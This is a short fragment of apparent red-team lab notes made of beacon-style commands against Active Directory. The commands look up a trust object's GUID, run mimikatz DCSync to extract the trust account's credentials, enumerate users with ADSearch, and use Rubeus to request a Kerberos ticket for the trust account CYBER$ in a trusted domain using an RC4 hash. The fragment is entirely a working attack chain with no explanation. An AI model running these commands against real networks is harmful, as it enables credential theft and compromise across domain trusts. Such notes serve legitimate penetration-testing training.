powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
run klist
powershell Get-Domain -Domain msp.org
```
